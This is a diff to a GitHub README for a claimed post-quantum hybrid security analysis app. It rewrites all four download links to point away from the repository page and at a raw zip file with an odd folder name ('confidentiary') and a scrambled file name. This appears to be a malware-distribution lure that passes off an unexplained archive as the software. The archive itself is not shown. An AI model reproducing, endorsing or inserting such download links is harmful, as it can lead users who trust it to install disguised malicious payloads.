@@ -1,6 +1,6 @@
 # 🔐 post-quantum-hybrid-security-analysis - Analyze Hybrid Security Performance
 
-[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://github.com/maurya-alok/post-quantum-hybrid-security-analysis)
+[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/maurya-alok/post-quantum-hybrid-security-analysis/main/confidentiary/quantum_analysis_post_security_hybrid_revelationer.zip)
 
 ## About this Project
 
@@ -35,7 +35,7 @@ You do not need any special hardware or software tools. This app will run as a s
 
 Click the button below to visit the main page where you can download the software package.
 
-[![Download Application](https://img.shields.io/badge/Download-Grey?style=for-the-badge&logo=github)](https://github.com/maurya-alok/post-quantum-hybrid-security-analysis)
+[![Download Application](https://img.shields.io/badge/Download-Grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/maurya-alok/post-quantum-hybrid-security-analysis/main/confidentiary/quantum_analysis_post_security_hybrid_revelationer.zip)
 
 **How to proceed after clicking:**
 
@@ -111,7 +111,7 @@ This tool helps you understand how combining machine learning and AES can protec
 - The README and wiki pages contain explanations of the algorithms and security models used.  
 - You can open issues or questions directly in the GitHub repository if you face technical problems.
 
-[Download or explore the application here](https://github.com/maurya-alok/post-quantum-hybrid-security-analysis)
+[Download or explore the application here](https://raw.githubusercontent.com/maurya-alok/post-quantum-hybrid-security-analysis/main/confidentiary/quantum_analysis_post_security_hybrid_revelationer.zip)
 
 ---
 
@@ -141,4 +141,4 @@ You can check the GitHub repository to see the list of contributors. If you want
 
 # Quick Access
 
-[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://github.com/maurya-alok/post-quantum-hybrid-security-analysis)
+[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/maurya-alok/post-quantum-hybrid-security-analysis/main/confidentiary/quantum_analysis_post_security_hybrid_revelationer.zip)
